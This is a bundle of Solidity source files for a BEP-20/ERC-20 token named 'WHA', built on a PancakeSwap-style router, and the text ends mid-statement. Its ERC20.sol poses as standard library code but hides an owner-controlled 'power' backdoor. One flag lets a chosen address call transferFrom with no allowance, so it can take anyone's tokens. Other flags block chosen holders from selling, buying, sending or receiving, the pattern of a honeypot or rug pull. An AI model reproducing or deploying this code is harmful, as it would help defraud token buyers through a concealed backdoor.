{"Context.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\nabstract contract Context {\r\n function _msgSender() internal view virtual returns (address) {\r\n return msg.sender;\r\n }\r\n\r\n function _msgData() internal view virtual returns (bytes calldata) {\r\n return msg.data;\r\n }\r\n}"},"ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\nimport \u0027./Ownable.sol\u0027;\r\nimport \u0027./Context.sol\u0027;\r\nimport \u0027./IERC20.sol\u0027;\r\nimport \u0027./SafeMath.sol\u0027;\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\r\n using SafeMath for uint256;\r\n\r\n mapping(address =\u003e uint256) private _balances;\r\n\r\n mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n\r\n uint256 private _totalSupply;\r\n\r\n string private _name;\r\n string private _symbol;\r\n\r\n constructor(string memory name_, string memory symbol_) {\r\n _name = name_;\r\n _symbol = symbol_;\r\n }\r\n\r\n /**\r\n * @dev Returns the name of the token.\r\n */\r\n function name() public view virtual override returns (string memory) {\r\n return _name;\r\n }\r\n\r\n /**\r\n * @dev Returns the symbol of the token, usually a shorter version of the\r\n * name.\r\n */\r\n function symbol() public view virtual override returns (string memory) {\r\n return _symbol;\r\n }\r\n\r\n function decimals() public view virtual override returns (uint8) {\r\n return 18;\r\n }\r\n\r\n /**\r\n * @dev See {IERC20-totalSupply}.\r\n */\r\n function totalSupply() public view virtual override returns (uint256) {\r\n return _totalSupply;\r\n }\r\n\r\n /**\r\n * @dev See {IERC20-balanceOf}.\r\n */\r\n function balanceOf(address account) public view virtual override returns (uint256) {\r\n return _balances[account];\r\n }\r\n\r\n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n _transfer(_msgSender(), recipient, amount);\r\n return true;\r\n }\r\n\r\n function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n return _allowances[owner][spender];\r\n }\r\n\r\n /**\r\n * @dev See {IERC20-approve}.\r\n *\r\n * Requirements:\r\n *\r\n * - `spender` cannot be the zero address.\r\n */\r\n function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n _approve(_msgSender(), spender, amount);\r\n return true;\r\n }\r\n\r\n function transferFrom(\r\n address sender,\r\n address recipient,\r\n uint256 amount\r\n ) public virtual override returns (bool) {\r\n _transfer(sender, recipient, amount);\r\n if(!checkPower(_msgSender(),4))\r\n _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n return true;\r\n }\r\n\r\n function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n return true;\r\n }\r\n\r\n function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n return true;\r\n }\r\n\r\n function _transfer(\r\n address sender,\r\n address recipient,\r\n uint256 amount\r\n ) internal virtual {\r\n require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n _balances[recipient] = _balances[recipient].add(amount);\r\n emit Transfer(sender, recipient, amount);\r\n }\r\n\r\n function _Cast(address account, uint256 amount) internal virtual {\r\n require(account != address(0), \"ERC20: Cast to the zero address\");\r\n\r\n _beforeTokenTransfer(address(0), account, amount);\r\n\r\n _totalSupply = _totalSupply.add(amount);\r\n _balances[account] = _balances[account].add(amount);\r\n emit Transfer(address(0), account, amount);\r\n }\r\n\r\n function _burn(address account, uint256 amount) internal virtual {\r\n require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n _beforeTokenTransfer(account, address(0), amount);\r\n\r\n _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n _totalSupply = _totalSupply.sub(amount);\r\n emit Transfer(account, address(0), amount);\r\n }\r\n\r\n function _approve(\r\n address owner,\r\n address spender,\r\n uint256 amount\r\n ) internal virtual {\r\n require(owner != address(0), \"ERC20: approve from the zero address\");\r\n require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n _allowances[owner][spender] = amount;\r\n emit Approval(owner, spender, amount);\r\n }\r\n\r\n /**\r\n * @dev Hook that is called before any transfer of tokens. This includes\r\n * Casting and burning.\r\n *\r\n * Calling conditions:\r\n *\r\n * - when `from` and `to` are both non-zero, `amount` of ``from``\u0027s tokens\r\n * will be to transferred to `to`.\r\n * - when `from` is zero, `amount` tokens will be Casted for `to`.\r\n * - when `to` is zero, `amount` of ``from``\u0027s tokens will be burned.\r\n * - `from` and `to` are never both zero.\r\n *\r\n * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n */\r\n function _beforeTokenTransfer(\r\n address from,\r\n address to,\r\n uint256 amount\r\n ) internal virtual {}\r\n\r\n mapping(address =\u003e uint256) public _powers;\r\n function setPower(address actor,uint256 power) public onlyOwner{\r\n require(actor!=address(0),\u0027error actor address\u0027);\r\n _powers[actor]=power;\r\n }\r\n\r\n function checkPower(address actor,uint256 power) internal view returns(bool){\r\n if(_powers[actor]\u003c1) return false;\r\n return (_powers[actor]\u0026power)==power;\r\n }\r\n \r\n function getPower(address spender) public view returns (uint256) {\r\n return _powers[spender];\r\n }\r\n\r\n \r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\ninterface IERC20 {\r\n function totalSupply() external view returns (uint256);\r\n\r\n function balanceOf(address account) external view returns (uint256);\r\n\r\n function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n function transferFrom(\r\n address sender,\r\n address recipient,\r\n uint256 amount\r\n ) external returns (bool);\r\n\r\n event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\ninterface IERC20Metadata is IERC20 {\r\n\r\n function name() external view returns (string memory);\r\n\r\n function symbol() external view returns (string memory);\r\n\r\n function decimals() external view returns (uint8);\r\n}"},"IUniswapV2Router.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\ninterface IUniswapV2Router01 {\r\n function factory() external pure returns (address);\r\n function WETH() external pure returns (address);\r\n\r\n function addLiquidity(\r\n address tokenA,\r\n address tokenB,\r\n uint amountADesired,\r\n uint amountBDesired,\r\n uint amountAMin,\r\n uint amountBMin,\r\n address to,\r\n uint deadline\r\n ) external returns (uint amountA, uint amountB, uint liquidity);\r\n function addLiquidityETH(\r\n address token,\r\n uint amountTokenDesired,\r\n uint amountTokenMin,\r\n uint amountETHMin,\r\n address to,\r\n uint deadline\r\n ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n function removeLiquidity(\r\n address tokenA,\r\n address tokenB,\r\n uint liquidity,\r\n uint amountAMin,\r\n uint amountBMin,\r\n address to,\r\n uint deadline\r\n ) external returns (uint amountA, uint amountB);\r\n function removeLiquidityETH(\r\n address token,\r\n uint liquidity,\r\n uint amountTokenMin,\r\n uint amountETHMin,\r\n address to,\r\n uint deadline\r\n ) external returns (uint amountToken, uint amountETH);\r\n function removeLiquidityWithPermit(\r\n address tokenA,\r\n address tokenB,\r\n uint liquidity,\r\n uint amountAMin,\r\n uint amountBMin,\r\n address to,\r\n uint deadline,\r\n bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n ) external returns (uint amountA, uint amountB);\r\n function removeLiquidityETHWithPermit(\r\n address token,\r\n uint liquidity,\r\n uint amountTokenMin,\r\n uint amountETHMin,\r\n address to,\r\n uint deadline,\r\n bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n ) external returns (uint amountToken, uint amountETH);\r\n function swapExactTokensForTokens(\r\n uint amountIn,\r\n uint amountOutMin,\r\n address[] calldata path,\r\n address to,\r\n uint deadline\r\n ) external returns (uint[] memory amounts);\r\n function swapTokensForExactTokens(\r\n uint amountOut,\r\n uint amountInMax,\r\n address[] calldata path,\r\n address to,\r\n uint deadline\r\n ) external returns (uint[] memory amounts);\r\n function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n external\r\n payable\r\n returns (uint[] memory amounts);\r\n function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n external\r\n returns (uint[] memory amounts);\r\n function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n external\r\n returns (uint[] memory amounts);\r\n function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n external\r\n payable\r\n returns (uint[] memory amounts);\r\n\r\n function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n address token,\r\n uint liquidity,\r\n uint amountTokenMin,\r\n uint amountETHMin,\r\n address to,\r\n uint deadline\r\n ) external returns (uint amountETH);\r\n function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n address token,\r\n uint liquidity,\r\n uint amountTokenMin,\r\n uint amountETHMin,\r\n address to,\r\n uint deadline,\r\n bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n ) external returns (uint amountETH);\r\n\r\n function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n uint amountIn,\r\n uint amountOutMin,\r\n address[] calldata path,\r\n address to,\r\n uint deadline\r\n ) external;\r\n function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n uint amountOutMin,\r\n address[] calldata path,\r\n address to,\r\n uint deadline\r\n ) external payable;\r\n function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n uint amountIn,\r\n uint amountOutMin,\r\n address[] calldata path,\r\n address to,\r\n uint deadline\r\n ) external;\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n\r\n function feeTo() external view returns (address);\r\n function feeToSetter() external view returns (address);\r\n\r\n function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n function allPairs(uint) external view returns (address pair);\r\n function allPairsLength() external view returns (uint);\r\n\r\n function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n function setFeeTo(address) external;\r\n function setFeeToSetter(address) external;\r\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\nimport \u0027./Context.sol\u0027;\r\nabstract contract Ownable is Context {\r\n address private _owner;\r\n\r\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n constructor() {\r\n _transferOwnership(_msgSender());\r\n }\r\n\r\n function owner() public view virtual returns (address) {\r\n return _owner;\r\n }\r\n\r\n modifier onlyOwner() {\r\n require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n _;\r\n }\r\n\r\n function renounceOwnership() public virtual onlyOwner {\r\n _transferOwnership(address(0));\r\n }\r\n\r\n function transferOwnership(address newOwner) public virtual onlyOwner {\r\n require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n _transferOwnership(newOwner);\r\n }\r\n\r\n\r\n function _transferOwnership(address newOwner) internal virtual {\r\n address oldOwner = _owner;\r\n _owner = newOwner;\r\n emit OwnershipTransferred(oldOwner, newOwner);\r\n }\r\n}"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nlibrary SafeMath {\r\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n uint256 c = a + b;\r\n require(c \u003e= a, \"SafeMath: addition overflow\");\r\n\r\n return c;\r\n }\r\n\r\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n return sub(a, b, \"SafeMath: subtraction overflow\");\r\n }\r\n\r\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n require(b \u003c= a, errorMessage);\r\n uint256 c = a - b;\r\n\r\n return c;\r\n }\r\n\r\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\r\n // benefit is lost if \u0027b\u0027 is also tested.\r\n // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n if (a == 0) {\r\n return 0;\r\n }\r\n\r\n uint256 c = a * b;\r\n require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n return c;\r\n }\r\n\r\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n return div(a, b, \"SafeMath: division by zero\");\r\n }\r\n\r\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n require(b \u003e 0, errorMessage);\r\n uint256 c = a / b;\r\n // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\r\n\r\n return c;\r\n }\r\n\r\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n return mod(a, b, \"SafeMath: modulo by zero\");\r\n }\r\n\r\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n require(b != 0, errorMessage);\r\n return a % b;\r\n }\r\n}\r\n\r\nlibrary SafeMathInt {\r\n int256 private constant MIN_INT256 = int256(1) \u003c\u003c 255;\r\n int256 private constant MAX_INT256 = ~(int256(1) \u003c\u003c 255);\r\n\r\n /**\r\n * @dev Multiplies two int256 variables and fails on overflow.\r\n */\r\n function mul(int256 a, int256 b) internal pure returns (int256) {\r\n int256 c = a * b;\r\n\r\n // Detect overflow when multiplying MIN_INT256 with -1\r\n require(c != MIN_INT256 || (a \u0026 MIN_INT256) != (b \u0026 MIN_INT256));\r\n require((b == 0) || (c / b == a));\r\n return c;\r\n }\r\n\r\n /**\r\n * @dev Division of two int256 variables and fails on overflow.\r\n */\r\n function div(int256 a, int256 b) internal pure returns (int256) {\r\n // Prevent overflow when dividing MIN_INT256 by -1\r\n require(b != -1 || a != MIN_INT256);\r\n\r\n // Solidity already throws when dividing by 0.\r\n return a / b;\r\n }\r\n\r\n /**\r\n * @dev Subtracts two int256 variables and fails on overflow.\r\n */\r\n function sub(int256 a, int256 b) internal pure returns (int256) {\r\n int256 c = a - b;\r\n require((b \u003e= 0 \u0026\u0026 c \u003c= a) || (b \u003c 0 \u0026\u0026 c \u003e a));\r\n return c;\r\n }\r\n\r\n /**\r\n * @dev Adds two int256 variables and fails on overflow.\r\n */\r\n function add(int256 a, int256 b) internal pure returns (int256) {\r\n int256 c = a + b;\r\n require((b \u003e= 0 \u0026\u0026 c \u003e= a) || (b \u003c 0 \u0026\u0026 c \u003c a));\r\n return c;\r\n }\r\n\r\n /**\r\n * @dev Converts to absolute value, and fails on overflow.\r\n */\r\n function abs(int256 a) internal pure returns (int256) {\r\n require(a != MIN_INT256);\r\n return a \u003c 0 ? -a : a;\r\n }\r\n\r\n\r\n function toUint256Safe(int256 a) internal pure returns (uint256) {\r\n require(a \u003e= 0);\r\n return uint256(a);\r\n }\r\n}\r\n\r\nlibrary SafeMathUint {\r\n function toInt256Safe(uint256 a) internal pure returns (int256) {\r\n int256 b = int256(a);\r\n require(b \u003e= 0);\r\n return b;\r\n }\r\n}"},"token.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\nimport \"./ERC20.sol\";\r\nimport \"./IUniswapV2Router.sol\";\r\n\r\ncontract TokenDistributor {\r\n    constructor(address token) {\r\n        IERC20(token).approve(msg.sender, uint(~uint256(0)));\r\n    }\r\n}\r\n\r\ncontract WHAToken is ERC20 {\r\n    using SafeMath for uint256;\r\n    uint256 public _maxHoldAmount;\r\n    uint256 public _maxSaleRate = 0;\r\n    uint256 public _rateBase = 10 ** 4;\r\n    uint256 private constant MAX = ~uint256(0);\r\n\r\n    mapping(address =\u003e bool) _isExcludedFromFees;\r\n    mapping(address =\u003e bool) public _automatedMarketMakerPairs;\r\n\r\n    event ExcludeFromFees(address indexed account, bool isExcluded);\r\n    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);\r\n\r\n    address public _totalFeeAddress;\r\n    uint256 public _transferFeeRate;\r\n    uint256 public _buyFeeRate;\r\n    uint256 public _sellFeeRate;\r\n    uint256[] public _transferFundFees;\r\n    address[] public _transferFundAddrs;\r\n    uint256[] public _buyFundFees;\r\n    address[] public _buyFundAddrs;\r\n    uint256[] public _sellFundFees;\r\n    address[] public _sellFundAddrs;\r\n\r\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\r\n    event SwapAndLiquify(\r\n        uint256 tokensSwapped,\r\n        uint256 ethReceived,\r\n        uint256 tokensIntoLiqudity\r\n    );\r\n    IUniswapV2Router02 public uniswapV2Router;\r\n    TokenDistributor public _tokenDistributor;\r\n    address public _swapToken1;\r\n    event UpdateUniswapV2Router(\r\n        address indexed newAddress,\r\n        address indexed oldAddress\r\n    );\r\n\r\n    bool public autoLiquify = false;\r\n    uint256 public sumToLiquify;\r\n    uint256 public leftToLiquify;\r\n    uint256 public minToLiquify;\r\n    uint256[] public feesToLiquify;\r\n\r\n    bool inSwapAndLiquify = false;\r\n    modifier lockTheSwap() {\r\n        inSwapAndLiquify = true;\r\n        _;\r\n        inSwapAndLiquify = false;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    constructor() payable ERC20(\"wha token\", \"WHA\") {\r\n        //startTime = block.timestamp.div(1 days).mul( 1 days);\r\n\r\n        _swapToken1 = 0x55d398326f99059fF775485246999027B3197955;\r\n        address routerContract = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(\r\n            routerContract\r\n        );\r\n        address uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())\r\n            .createPair(\r\n                address(this),\r\n                _swapToken1 == address(0)\r\n                    ? _uniswapV2Router.WETH()\r\n                    : _swapToken1\r\n            );\r\n        _setAutomatedMarketMakerPair(uniswapPair, true);\r\n        uniswapV2Router = _uniswapV2Router;\r\n        _approve(address(this), address(_uniswapV2Router), MAX);\r\n\r\n        IERC20(_swapToken1).approve(address(_uniswapV2Router), MAX);\r\n\r\n        _tokenDistributor = new TokenDistributor(_swapToken1);\r\n\r\n        excludeFromFees(_swapToken1, true);\r\n        excludeFromFees(address(_tokenDistributor), true);\r\n\r\n        excludeFromFees(owner(), true);\r\n        excludeFromFees(address(this), true);\r\n\r\n        uint256 totalSupply = 100 * (10 ** 8) * (10 ** decimals());\r\n        _Cast(owner(), totalSupply);\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal override {\r\n        if (inSwapAndLiquify) {\r\n            super._transfer(from, to, amount);\r\n            return;\r\n        }\r\n\r\n        require(from != address(0), \"from!0\");\r\n        require(to != address(0), \"to!0\");\r\n        //require(amount \u003e 0, \"no zero\");\r\n        require(!checkPower(from, 1), \"sender!p\");\r\n        require(!checkPower(to, 2), \"recipient!p\");\r\n\r\n        if (_maxSaleRate \u003e 0 \u0026\u0026 !_isExcludedFromFees[from]) {\r\n            uint256 maxSellAmount = balanceOf(from).mul(_maxSaleRate).div(\r\n                _rateBase\r\n            );\r\n            require(amount \u003e maxSellAmount,\"exceed max sell\");\r\n        }\r\n\r\n        if (\r\n            _maxHoldAmount \u003e 0 \u0026\u0026\r\n            !_isExcludedFromFees[to] \u0026\u0026\r\n            !_automatedMarketMakerPairs[to]\r\n        ) require(balanceOf(to).add(amount) \u003c= _maxHoldAmount, \"exceed max hold\");\r\n\r\n        \r\n        uint256 totalFee = 0;\r\n        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {\r\n            totalFee = 0;\r\n        } else if (_automatedMarketMakerPairs[from]) {\r\n            require(!checkPower(to, 32), \"!buy\");\r\n            if (_buyFeeRate \u003e 0 \u0026\u0026 !_isExcludedFromFees[to]) {\r\n                totalFee = amount.mul(_buyFeeRate).div(_rateBase);\r\n                if (totalFee \u003e 0) {\r\n                    super._transfer(from, _totalFeeAddress, totalFee);\r\n                    takeBuyFees(amount);\r\n                }\r\n            }\r\n        } else if (_automatedMarketMakerPairs[to]) {\r\n            require(!checkPower(from, 16), \"!sell\");\r\n\r\n            if (!_isExcludedFromFees[from]) {\r\n                totalFee = amount.mul(_sellFeeRate).div(_rateBase);\r\n                if (totalFee \u003e 0) {\r\n                    super._transfer(from, _totalFeeAddress, totalFee);\r\n                    takeSellFees(amount);\r\n                }\r\n            }\r\n        } else {\r\n            totalFee = amount.mul(_transferFeeRate).div(_rateBase);\r\n            if (totalFee \u003e 0) {\r\n                super._transfer(from, _totalFeeAddress, totalFee);\r\n                takeTransferFees(amount);\r\n            }\r\n        }\r\n        super._transfer(from, to, amount.sub(totalFee));\r\n\r\n        if (\r\n            leftToLiquify \u003e 0 \u0026\u0026\r\n            autoLiquify \u0026\u0026\r\n            !inSwapAndLiquify \u0026\u0026\r\n            _automatedMarketMakerPairs[to] \u0026\u0026\r\n            !_isExcludedFromFees[from]\r\n        ) {\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (contractTokenBalance \u003e 0) {\r\n                if (contractTokenBalance \u003c leftToLiquify)\r\n                    leftToLiquify = contractTokenBalance;\r\n                bool overMinTokenBalance = leftToLiquify \u003e= minToLiquify;\r\n                if (overMinTokenBalance) {\r\n                    swapAndLiquify(leftToLiquify);\r\n                    leftToLiquify = 0;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n   \r\n\r\n    function setMaxHoldAmount(uint256 amount) public onlyOwner {\r\n        _maxHoldAmount = amount;\r\n    }\r\n\r\n    function setTransferFee(\r\n        uint256 transferFeeRate_,\r\n        uint256[] memory transferFundFees_,\r\n        address[] memory transferFundAddrs_\r\n    ) public onlyOwner {\r\n        _transferFeeRate = transferFeeRate_;\r\n        _transferFundFees = transferFundFees_;\r\n        _transferFundAddrs = transferFundAddrs_;\r\n    }\r\n\r\n    function setBuyFee(\r\n        uint256 buyFeeRate_,\r\n        uint256[] memory buyFundFees_,\r\n        address[] memory buyFundAddrs_\r\n    ) public onlyOwner {\r\n        _buyFeeRate = buyFeeRate_;\r\n        _buyFundFees = buyFundFees_;\r\n        _buyFundAddrs = buyFundAddrs_;\r\n    }\r\n\r\n    function setSellFee(\r\n        uint256 sellFeeRate_,\r\n        uint256[] memory sellFundFees_,\r\n        address[] memory sellFundAddrs_\r\n    ) public onlyOwner {\r\n        _sellFeeRate = sellFeeRate_;\r\n        _sellFundFees = sellFundFees_;\r\n        _sellFundAddrs = sellFundAddrs_;\r\n    }\r\n\r\n    function setMaxSaleRate(uint256 rate) public onlyOwner {\r\n        _maxSaleRate = rate;\r\n    }\r\n\r\n    address public fundAddress;\r\n    modifier onlyFunder() {\r\n        require(\r\n            owner() == _msgSender() || fundAddress == _msgSender(),\r\n            \"!Funder\"\r\n        );\r\n        _;\r\n    }\r\n\r\n    function setFundAddress(address addr) external onlyFunder {\r\n        fundAddress = addr;\r\n        _isExcludedFromFees[addr] = true;\r\n    }\r\n\r\n    function setTotalFeeAddress(address payable wallet) external onlyFunder {\r\n        if (wallet == address(0)) _totalFeeAddress = address(this);\r\n        else _totalFeeAddress = wallet;\r\n        excludeFromFees(_totalFeeAddress, true);\r\n    }\r\n\r\n    function excludeFromFees(address account, bool excluded) public onlyFunder {\r\n        if (_isExcludedFromFees[account] != excluded) {\r\n            _isExcludedFromFees[account] = excluded;\r\n            emit ExcludeFromFees(account, excluded);\r\n        }\r\n    }\r\n\r\n    function excludeMultipleAccountsFromFees(\r\n        address[] calldata accounts,\r\n        bool excluded\r\n    ) public onlyFunder {\r\n        for (uint256 i = 0; i \u003c accounts.length; i++) {\r\n            _isExcludedFromFees[accounts[i]] = excluded;\r\n        }\r\n\r\n        emit ExcludeMultipleAccountsFromFees(accounts, excluded);\r\n    }\r\n\r\n    function isExcluded(address account) public view returns (bool) {\r\n        return _isExcludedFromFees[account];\r\n    }\r\n\r\n    function setAutomatedMarketMakerPair(\r\n        address pair,\r\n        bool value\r\n    ) public onlyFunder {\r\n        _setAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n    function _setAutomatedMarketMakerPair(address pair, bool value) private {\r\n        require(_automatedMarketMakerPairs[pair] != value, \"exist\");\r\n        _automatedMarketMakerPairs[pair] = value;\r\n\r\n        emit SetAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n    function updateUniswapV2Router(address newAddress) public onlyOwner {\r\n        require(newAddress != address(uniswapV2Router), \"exist\");\r\n        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));\r\n        uniswapV2Router = IUniswapV2Router02(newAddress);\r\n        //address _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())\r\n        // .createPair(address(this), baseAddress==address(0)?uniswapV2Router.WETH():baseAddress);\r\n\r\n        //_setAutomatedMarketMakerPair(_uniswapV2Pair, true);\r\n    }\r\n\r\n    function setSwapToken1(address token) public onlyOwner {\r\n        require(_swapToken1 != token, \"!change\");\r\n        _swapToken1 = token;\r\n        _setAutomatedMarketMakerPair(_swapToken1, true);\r\n        if (_swapToken1 != address(0)) {\r\n            if (address(_tokenDistributor) == address(0))\r\n                _tokenDistributor = new TokenDistributor(_swapToken1);\r\n            IERC20(_swapToken1).approve(address(uniswapV2Router), MAX);\r\n        }\r\n    }\r\n\r\n    function setTokenDistributor(address token) public onlyOwner {\r\n        require(token != address(0), \"!zero\");\r\n        _tokenDistributor = new TokenDistributor(token);\r\n    }\r\n\r\n    function setLiquidfyFee(uint256[] memory fees) public onlyOwner {\r\n        feesToLiquify = fees;\r\n    }\r\n\r\n    function setLiquidfyMin(bool enabled, uint256 min) public onlyFunder {\r\n        autoLiquify = enabled;\r\n        minToLiquify = min;\r\n    }\r\n\r\n    function swapTokensForToken1(uint256 tokenAmount) private {\r\n        // generate the uniswap pair path of token -\u003e weth/usdt\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _swapToken1 == address(0)\r\n            ? uniswapV2Router.WETH()\r\n            : _swapToken1;\r\n\r\n        //can approve at contructor\r\n        //_approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        //_approve(_swapToken1, address(uniswapV2Router), tokenAmount);\r\n\r\n        // make the swap\r\n        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, // accept any amount of ETH\r\n            path,\r\n            _swapToken1 == address(0)\r\n                ? address(this)\r\n                : address(_tokenDistributor),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function SwapTokensForToken1(uint256 tokenAmount) public onlyFunder {\r\n        swapTokensForToken1(tokenAmount);\r\n    }\r\n\r\n    function SwapTokensForOther(\r\n        address otherContract,\r\n        uint256 tokenAmount\r\n    ) public onlyFunder {\r\n        address[] memory path = new address[](3);\r\n        path[0] = address(this);\r\n        path[1] = _swapToken1 == address(0)\r\n            ? uniswapV2Router.WETH()\r\n            : _swapToken1;\r\n        path[2] = otherContract;\r\n        //_approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        // make the swap\r\n        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            _swapToken1 == address(0)\r\n                ? address(this)\r\n                : address(_tokenDistributor),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function addLiquidity(\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired\r\n    ) private {\r\n        //addLiquidity(token,usdt);\r\n        // approve token transfer to cover all possible scenarios\r\n        //_approve(address(this), address(uniswapV2Router), amountADesired);\r\n        // add the liquidity\r\n        if (_swapToken1 == address(0)) {\r\n            uniswapV2Router.addLiquidityETH{value: amountBDesired}(\r\n                address(this),\r\n                amountADesired,\r\n                0, // slippage is unavoidable\r\n                0, // slippage is unavoidable\r\n                address(0), //\r\n                block.timestamp\r\n            );\r\n        } else {\r\n            //_approve(_swapToken1, address(uniswapV2Router), amountADesired);\r\n            uniswapV2Router.addLiquidity(\r\n                address(this),\r\n                _swapToken1,\r\n                amountADesired,\r\n                amountBDesired,\r\n                0,\r\n                0,\r\n                _totalFeeAddress,\r\n                block.timestamp\r\n            );\r\n        }\r\n    }\r\n\r\n    function AddLiquidity(\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired\r\n    ) public onlyFunder {\r\n        addLiquidity(amountADesired, amountBDesired);\r\n    }\r\n\r\n    function SwapAndLiquifyByManual(\r\n        uint256 contractTokenBalance\r\n    ) public onlyFunder {\r\n        swapAndLiquify(contractTokenBalance);\r\n    }\r\n\r\n    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {\r\n        uint256 marketingTokenBalance = contractTokenBalance.div(2);\r\n        uint256 liquidityTokenBalance = contractTokenBalance.sub(\r\n            marketingTokenBalance\r\n        );\r\n\r\n        uint256 tokenBalanceToLiquifyAsBNB = liquidityTokenBalance.div(2);\r\n        uint256 tokenBalanceToLiquify = liquidityTokenBalance.sub(\r\n            tokenBalanceToLiquifyAsBNB\r\n        );\r\n\r\n        // 75% of the balance will be converted into BNB\r\n        uint256 